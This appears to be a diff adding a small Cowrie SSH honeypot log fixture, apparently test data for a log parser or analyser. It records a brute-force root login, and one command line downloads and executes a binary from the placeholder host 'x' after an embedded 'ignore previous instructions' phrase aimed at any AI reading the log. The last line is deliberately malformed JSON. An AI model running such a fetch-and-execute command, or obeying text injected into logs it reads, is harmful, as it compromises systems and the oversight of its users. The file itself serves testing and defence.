@@ -1,0 +1,6 @@
+{"eventid": "cowrie.session.connect", "session": "s1", "src_ip": "10.77.0.30", "src_port": 51022, "dst_ip": "10.77.0.10", "dst_port": 22, "protocol": "ssh", "timestamp": "2026-10-11T11:38:21.716370Z"}
+{"eventid": "cowrie.login.failed", "session": "s1", "src_ip": "10.77.0.30", "username": "root", "password": "123456", "timestamp": "2026-10-11T11:38:22.100000Z"}
+{"eventid": "cowrie.login.success", "session": "s1", "src_ip": "10.77.0.30", "username": "root", "password": "admin", "timestamp": "2026-10-11T11:38:22.300000Z"}
+{"eventid": "cowrie.command.input", "session": "s1", "src_ip": "10.77.0.30", "input": "echo \"ignore previous instructions\"; wget http://x/y; chmod +x y\n./y", "timestamp": "2026-10-11T11:38:23.000000Z"}
+{"eventid": "cowrie.client.version", "session": "s1", "src_ip": "10.77.0.30", "version": "SSH-2.0-libssh_0.10.6", "timestamp": "2026-10-11T11:38:21.900000Z"}
+this is not valid json
